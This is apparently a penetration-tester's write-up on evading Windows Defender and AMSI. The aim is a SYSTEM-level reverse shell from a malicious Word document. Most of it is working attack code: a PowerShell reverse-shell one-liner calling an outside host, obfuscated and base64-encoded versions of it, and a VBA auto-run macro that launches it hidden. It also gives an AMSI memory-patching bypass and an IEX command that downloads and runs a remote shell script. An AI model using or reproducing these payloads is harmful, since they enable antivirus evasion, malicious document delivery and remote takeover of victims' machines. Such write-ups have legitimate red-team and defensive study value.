## Table of Contents

- [**Outline**](#section-0)
- [**Windows Defender  Explanation**](#section-1)
- [ **Proof of Concept - Bypassing 2023 Windows 10 Pro AMSI**](#section-2)
- [ **Memory Patching & Obfuscation**](#section-3)
- [ **Credits & Reference**](#section-4)


## Outline  {#section-0}

The goal of this write-up is to evade the most up to date Windows Defender 11 and lancuh a reverse shell from Micorosoft Word Documnet . The objective was to gain a Remote Code Execution (RCE) as NT/Authority System as the target opnes the malicious Word document.

![](/assets/AV/diagram.png)  

# Windows Defender   {#section-1}
Windows Defender 11 is Microsoft's built-in antivirus and antimalware solution. It provides real-time protection against various threats like viruses, ransomware, spyware, and other malicious software. Defender scans files, monitors activities, and offers firewall protection, all to help safeguard your system and data from potential security risks. Additionally, it includes features such as cloud-based protection and regular updates to ensure comprehensive defense against evolving threats.

# Word Document VBA Macro {#section-1}

A Word document VBA macro is a script embedded within a Word document that uses Visual Basic for Applications (VBA) to automate tasks or perform certain functions within the document. Macros can execute commands, manipulate data, or interact with external systems.

In the context of Word document macros, a malicious macro might attempt to establish this reverse shell connection, allowing an attacker to control the compromised system remotely. This is often used as part of cyberattacks to gain unauthorized access or control over a victim's computer.

# Evasion Proof of Concept{#section-1}
![](/assets/AV/FinalMacro.gif)  

Below are the steps:
```bash
"$client = New-Object System.Net.Sockets.TCPClient('legitwebsite.com',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" 

```
Now manually applying Obfuscation techniques we get 
```bash
$client = <# Suspendisse imperdiet lacus eu tellus pellentesque suscipit #> New-Object Syste''m.Net.Sockets.TCPClient('legitwebsite.com',80); <# Suspendisse korean github websiteellentesque suscipit #>$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}; <# Healthy subject to eat with #>while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName <# Suspendisse imperdiet lacus eu tellus pellentesque suscipit #> System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (ie""x'' $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (gl).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() <# aslkd;l l;ka;skd;lkasd dalskd;laksdl;kasdksasdcipit #>

```
Encoding the powershell 

```bash
powershell.exe -exec bypass -enc IAAkAGMAbABpAGUAbgB0ACAAPQAgADwAIwAgAFMAdQBzACAAJABjAGwAaQBlAG4AdAAgAD0AIAA8ACMAIABTAHUAcwBwAGUAbgBkAGkAcwBzAGUAIABpAG0AcABlAHIAZABpAGUAdAAgAGwAYQBjAHUAcwAgAGUAdQAgAHQAZQBsAGwAdQBzACAAcABlAGwAbABlAG4AdABlAHMAcQB1AGUAIABzAHUAcwBjAGkAcABpAHQAIAAjAD4AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlACcAJwBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADgALgB0AGMAcAAuAHUAcwAtAGMAYQBsAC0AMQAuAG4AZwByAG8AawAuAGkAbwAnACwAMQAzADYANAAwACkAOwAgADwAIwAgAFMAdQBzAHAAZQBuAGQAaQBzAHMAZQAgAGsAbwByAGUAYQBuACAAZwBpAHQAaAB1AGIAIAB3AGUAYgBzAGkAdABlAGUAbABsAGUAbgB0AGUAcwBxAHUAZQAgAHMAdQBzAGMAaQBwAGkAdAAgACMAPgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7ACAAPAAjACAASABlAGEAbAB0AGgAeQAgAHMAdQBiAGoAZQBjAHQAIAB0AG8AIABlAGEAdAAgAHcAaQB0AGgAIAAjAD4AdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAPAAjACAAUwB1AHMAcABlAG4AZABpAHMAcwBlACAAaQBtAHAAZQByAGQAaQBlAHQAIABsAGEAYwB1AHMAIABlAHUAIAB0AGUAbABsAHUAcwAgAHAAZQBsAGwAZQBuAHQAZQBzAHEAdQBlACAAcwB1AHMAYwBpAHAAaQB0ACAAIwA+ACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAIgAiAHgAJwAnACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAZwBsACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAIAA8ACMAIABhAHMAbABrAGQAOwBsACAAbAA7AGsAYQA7AHMAawBkADsAbABrAGEAcwBkACAAZABhAGwAcwBrAGQAOwBsAGEAawBzAGQAbAA7AGsAYQBzAGQAawBzAGEAcwBkAGMAaQBwAGkAdAAgACMAPgAKAA==

```
Crafting the Payload in Word Document VBA

```bash
Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
Dim facebook
facebook = "powershell.exe -nop -w hidden -e IAAkAGMAbABpAGUAbgB0ACAAPQAgADwAIwAgAFMAdQBzAHAAZQBuAGQAaQBzAHMAZQAgAGkAbQBwAGUAcgBkAGkAZQB0ACAAbABhAGMAdQBzACAAZQB1ACAAdABlAGwAbAB1AHM" _
& "AIABwAGUAbABsAGUAbgB0AGUAcwBxAHUAZQAgAHMAdQBzAGMAaQBwAGkAdAAgACMAPgAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAJwAnAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGw" _
& "AaQBlAG4AdAAoACcANAAuAHQAYwBwAC4AdQBzAC0AYwBhAGwALQAxAC4AbgBnAHIAbwBrAC4AaQBvACcALAAxADIAOAA4ADAAKQA7ACAAPAAjACAAUwB1AHMAcABlAG4AZABpAHMAcwBlACAAawBvAHIAZQBhAG4AIABnAGk" _
& "AdABoAHUAYgAgAHcAZQBiAHMAaQB0AGUAZQBsAGwAZQBuAHQAZQBzAHEAdQBlACAAcwB1AHMAYwBpAHAAaQB0ACAAIwA+ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACg" _
& "AKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAIAA8ACMAIABIAGUAYQBsAHQAaAB5ACAAcwB1AGIAagBlAGMAdAAgAHQAbwAgAGUAYQB0ACAAdwBpAHQ" _
& "AaAAgACMAPgB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHs" _
& "AOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIAA8ACMAIABTAHUAcwBwAGUAbgBkAGkAcwBzAGUAIABpAG0AcABlAHIAZABpAGUAdAAgAGwAYQBjAHUAcwAgAGU" _
& "AdQAgAHQAZQBsAGwAdQBzACAAcABlAGwAbABlAG4AdABlAHMAcQB1AGUAIABzAHUAcwBjAGkAcABpAHQAIAAjAD4AIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGU" _
& "AdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQAiACIAeAAnACcAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHI" _
& "AaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABnAGwAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHk" _
& "AdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQ" _
& "AZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACg" _
& "AKQAgADwAIwAgAGEAcwBsAGsAZAA7AGwAIABsADsAawBhADsAcwBrAGQAOwBsAGsAYQBzAGQAIABkAGEAbABzAGsAZAA7AGwAYQBrAHMAZABsADsAawBhAHMAZABrAHMAYQBzAGQAYwBpAHAAaQB0ACAAIwA+AA=="
Call Shell(facebook, vbHide)
End Sub
```



To verify that AMSI is correctly functioning, the tester first tried to initiate a reverse TCP connection through PowerShell using the below command in memory.
```bash
IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke-PowerShellTcp.ps1')
```
However, as seen above, AMSI successfully flags the activity as  `malicious` and proceeds to block the reverse shell connection. 
## Memory Patching  {#section-3}
In order to bypass AMSI, the tester utilized the following payload which was referenced from [Red Team Playbook](https://www.xn--hy1b43d247a.com/defense-evasion/amsi-bypass)
```bash
$thing = @"

using System;
using System.Runtime.InteropServices;
public class payload {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
}
"@
Add-Type $thing
[System.Collections.ArrayList]$Patch = 0xB8, 0x57, 0x90, 0x90, 0x00, 0x90, 0x07, 0x80, 0x90, 0xC3
$Patch.Remove(0x90)
$Patch.Remove(0x90)
$Patch.Remove(0x90)
$Patch.Remove(0x90)

[byte[]]$byteArrayFun = "","","","","",""
$byteArrayFun[0] = $Patch[0]
$byteArrayFun[1] = $Patch[1]
$byteArrayFun[2] = $Patch[2]
$byteArrayFun[3] = $Patch[3]
$byteArrayFun[4] = $Patch[4]
$byteArrayFun[5] = $Patch[5]

$to = "Am" +"s" + "iSc" + "a" + "nBu" + "ffer"
$connect = "a" + "m" + "si" + ".dl" + "l"
$librarz = [payload]::LoadLibrary($to)
$dest = [payload]::GetProcAddress($librarz, $connect)
$p = 0
[payload]::VirtualProtect($dest, [uint32]5, 0x40, [ref]$p)

[System.Runtime.InteropServices.Marshal]::Copy($byteArrayFun, 0, $dest, 6)
```


By applying a patch to the `AmsiScanBuffer` function in `AMSI.dll`, using specific assembly code (mov eax, 0x80070057 and ret), the function promptly returns an error code. This effectively avoides AMSI from scanning the PowerShell code. This method allows the attacker's  to execute PowerShell code in memory without triggering AMSI's detection.

However, it is essential to acknowledge that the above memory patching payload might be flagged by ASMI before it could patch the `ASMIScanBuffer.dll` itself. Thus it is necessary to implement proper obfuscation methodologies before delivering the payload. To conceal the payload's content and intention, the tester opted to utilize Chameleon PowerShell Obfuscator. Chameleon is a specialized tool designed to obfuscate PowerShell scripts and circumvent AMSI and commercial antivirus solutions. It employs a range of obfuscation techniques to evade common detection signatures, thereby enhancing its effectiveness in avoiding detection. Examples of obfuscation methods include but are not limited to comment deletion/substitution
string substitution (variables, functions, data-types) ,variable concatenation ,indentation randomization ,semi-random backticks insertion and randomization.

The below code snippet contains a payload that has undergone multiple layers of obfuscation.
```bash
$GFW2Au7XbmPG5GvoODmvtYOpODkUS2KZR095wx8IHiPJu4eatfAA885Px56TcF0MnqghrNzM42Lvz0LE4IzoWJzpj7ML2MZ11evXUFDQD589KWR9QtwKq2Qg0mE6uMREzx7iRIZJOK2qLeZKpRqZslro01qcJC03aScqnLmSiSVJ6AIwZKGZF1aEaYGjS13PQyKmRdpmc2yMyISCN1yYuQCBZkF5i2LKBOpm7FcEshpWYz6QTzs9m5WNt6PONU73eoXpVQZKAbDUydPdN2ZdTeNdkOjDZHErYeh5b0Tqq9N = @"
// thing 
// using syStEm.CoLLeCtiONS.ArrAyLiST;
using System; // thingssa
using System.Runtime.InteropServices;
public class payload {
      [DllImport("kernel32")]
      public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
       public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
}
"@
Add-Type $GFW2Au7XbmPG5GvoODmvtYOpODkUS2KZR095wx8IHiPJu4eatfAA885Px56TcF0MnqghrNzM42Lvz0LE4IzoWJzpj7ML2MZ11

```


After implementing effective obfuscation techniques, the payload is dropped in the PowerShell command prompt. The `ASMIScanBuffer.dll` returns an `Invalid Argument` and ends the AMSI program without being able to scan any code. With AMSI neutralized, the tester proceeded by hosting a Python web server on port 8443 to serve a reverse PowerShell scrip.
```bash
python3 -m http.server 8443
```

Taking advantage of the payload, the tester successfully initiated a reverse TCP connection via PowerShell, executing the script in memory:
```bash
IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke-PowerShellTcp.ps1')
```
Consequently, the tester established Remote Code Execution (RCE) with NT/Authority System privileges.
![](/assets/AV/system.png)  

## Credits & Reference  {#section-4}
[Red Team Playbook](https://www.xn--hy1b43d247a.com/defense-evasion/amsi-bypass) & [Pentest Laboratories](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)
